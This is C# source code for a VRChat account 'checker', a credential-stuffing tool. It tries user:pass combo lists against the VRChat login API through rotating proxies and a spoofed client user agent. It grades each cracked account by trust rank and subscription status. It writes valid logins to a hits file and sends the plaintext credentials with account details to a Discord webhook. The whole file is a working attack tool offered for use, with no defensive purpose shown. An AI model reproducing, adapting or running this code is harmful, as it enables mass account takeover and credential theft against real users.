using Discord.Webhook;
using Discord;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using TopLib;
using Newtonsoft.Json.Linq;

namespace VRChat_Checker
{
    internal class Check
    {
        public static Variables var = new Variables();
        public static data Combos = new data();
        public static string filename = DateTime.Now.ToString("yyyy-MM-dd_hh.mm.ss");
        //Read Webhook URL
        public static string path = "Webhook URL.txt";
        public static string Webhook = File.ReadAllText(Check.path);
        //Parse Function
        public static string Parse(string source, string left, string right) => source.Split(new string[1]
        {
      left
        }, StringSplitOptions.None)[1].Split(new string[1]
        {
      right
        }, StringSplitOptions.None)[0];

        [STAThread]
        private static void Main(string[] args)
        {
            nod.Config(new configuration(true, "VRChat", "Top"));
            TopLib.Checker.Init();
            TopLib.Checker.Start(new MethodInvoker(Check.Start));
        }
        private static void Saver(string name, string line)
        {
            if (!Directory.Exists("Hits"))
                Directory.CreateDirectory("Hits");
            using (StreamWriter streamWriter = new StreamWriter("Hits\\" + name + ".txt", true))
                streamWriter.WriteLine(line);
        }

        public static void Start()
        {
            while (true)
            {
                try
                {
                    if (Variables.ComboList.Count - 1 <= Variables.Index)
                        break;
                    ++Variables.Index;
                    if (((IEnumerable<string>)Variables.ComboList[Variables.Index].Split(':')).Count<string>() == 2)
                    {
                        Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest();
                        int index = new Random().Next(0, TopLib.Checker.var.ProxyList.Count);
                        string proxy = TopLib.Checker.var.ProxyList[index];
                        switch (TopLib.Checker.var.proxyType)
                        {
                            case xNet.ProxyType.Http:
                                httpRequest.Proxy = (Leaf.xNet.ProxyClient)Leaf.xNet.HttpProxyClient.Parse(proxy);
                                break;
                            case xNet.ProxyType.Socks4:
                                httpRequest.Proxy = (Leaf.xNet.ProxyClient)Leaf.xNet.Socks4ProxyClient.Parse(proxy);
                                break;
                            case xNet.ProxyType.Socks5:
                                httpRequest.Proxy = (Leaf.xNet.ProxyClient)Leaf.xNet.Socks5ProxyClient.Parse(proxy);
                                break;
                        }
                        httpRequest.Proxy.ConnectTimeout = Convert.ToInt32(4000);
                        string User = Variables.ComboList[Variables.Index].Split(':')[0];
                        string Pass = Variables.ComboList[Variables.Index].Split(':')[1];
                        string line = User + ":" + Pass;
                        try
                        {
                            string source;
                            while (true)
                            {
                                httpRequest.IgnoreProtocolErrors = true;
                                string base64String = Convert.ToBase64String(Encoding.ASCII.GetBytes(User + ":" + Pass));
                                httpRequest.AddHeader("Authorization", "Basic " + base64String);
                                httpRequest.UserAgent = "VRC.Core.BestHTTP";
                                source = httpRequest.Get("https://api.vrchat.cloud/api/1/auth/user?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26&organization=vrchat").ToString();
                                if (source != null)
                                {
                                    if (source.Contains("currentAvatar"))
                                    {
                                        goto Success;
                                    }
                                    else
                                        break;
                                }
                                ++Variables.Retries;
                            }
                            ++TopLib.Checker.Increment_CPM;
                            ++Variables.Fails;
                            ++Variables.Progress;
                            continue;
                        Success:
                            ++TopLib.Checker.Increment_CPM;
                            ++Variables.Hits;
                            ++Variables.Progress;
                            //Parse Response
                            dynamic JSource = JObject.Parse(source);
                            string displayname = JSource.displayName;
                            string username = JSource.username;
                            string emailVerified = JSource.emailVerified;
                            string avatarURL = JSource.currentAvatarImageUrl;
                            string id = JSource.id;
                            string vrcplus = "False";
                            //Trust Cap
                            if (source.Contains("system_supporter"))
                                vrcplus = "True";
                            string Trust = "Visitor";
                            if (source.Contains("system_trust_basic"))
                                Trust = "New User";
                            if (source.Contains("system_trust_known"))
                                Trust = "User";
                            if (source.Contains("system_trust_trusted"))
                                Trust = "Known User";
                            if (source.Contains("system_trust_veteran"))
                                Trust = "Trusted User";
                            if (source.Contains("system_trust_legend"))
                                Trust = "Veteran User";
                            if (source.Contains("system_legend"))
                                Trust = "Legendary User";
                            //Log Hit
                            string hitLog = "[" + Trust + "] " + line + " | Display Name: " + displayname + " | Username: " + username + " | VRC+: " + vrcplus + " | Email Verified?: " + emailVerified;
                            switch (Trust)
                            {
                                case "Visitor":
                                    Colorful.Console.WriteLine(hitLog, ColorTranslator.FromHtml("#CCCCCC"));
                                    break;
                                case "New User":
                                    Colorful.Console.WriteLine(hitLog, ColorTranslator.FromHtml("#1778FF"));
                                    break;
                                case "User":
                                    Colorful.Console.WriteLine(hitLog, ColorTranslator.FromHtml("#2BCF5C"));
                                    break;
                                case "Known User":
                                    Colorful.Console.WriteLine(hitLog, ColorTranslator.FromHtml("#FF7B42"));
                                    break;
                                case "Trusted User":
                                    Colorful.Console.WriteLine(hitLog, ColorTranslator.FromHtml("#8143E6"));
                                    break;
                                case "Veteran User":
                                    Colorful.Console.WriteLine(hitLog, Color.Yellow);
                                    break;
                                case "Legendary User":
                                    Colorful.Console.WriteLine(hitLog, Color.HotPink);
                                    break;
                            }
                            if (new FileInfo(path).Length != 0)
                            {
                                Check.Saver(Check.filename, line + " | Level: " + Trust + " | Display Name: " + displayname + " | Username: " + username + " | VRC+: " + vrcplus + " | UID: " + id + " | Email Verified?: " + emailVerified);
                                //Create Webhook
                                DiscordWebhook hook = new DiscordWebhook();
                                hook.Url = Check.Webhook;
                                //Create Message
                                DiscordMessage message = new DiscordMessage();
                                message.TTS = false; //read message to everyone on the channel
                                message.Username = "VRC Checker";
                                message.AvatarUrl = "https://logodix.com/logo/2109104.png";
                                //embeds
                                DiscordEmbed embed = new DiscordEmbed();
                                embed.Title = Trust;
                                embed.Timestamp = DateTime.Now;
                                embed.Color = Color.Red; //alpha will be ignored, you can use any RGB color
                                //embed.Image = new EmbedMedia() { Url = "https://www.youtube.com/embed/XiBnFNtYMYk?controls=0", Width = 560, Height = 315 }; //valid for thumb and video
                                embed.Author = new EmbedAuthor() { Name = displayname, Url = "https://vrchat.com/home/user/" + id, IconUrl = avatarURL };
                                //fields
                                embed.Fields = new List<EmbedField>();
                                embed.Fields.Add(new EmbedField() { Name = "Name", Value = username, InLine = true });
                                embed.Fields.Add(new EmbedField() { Name = "Display Name", Value = displayname, InLine = true });
                                embed.Fields.Add(new EmbedField() { Name = "Login Info", Value = line, InLine = false });
                                embed.Fields.Add(new EmbedField() { Name = "Rank", Value = Trust, InLine = true });
                                embed.Fields.Add(new EmbedField() { Name = "VRC+", Value = vrcplus, InLine = true });
                                embed.Fields.Add(new EmbedField() { Name = "UID", Value = id, InLine = false });
                                embed.Fields.Add(new EmbedField() { Name = "Email Verified?", Value = emailVerified, InLine = false });
                                //set embed
                                message.Embeds = new List<DiscordEmbed>();
                                message.Embeds.Add(embed);
                                //Send
                                hook.Send(message);
                            }
                        }
                        catch (Exception ex)
                        {
                            ++Variables.Retries;
                            ++Variables.Progress;

                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
    }
}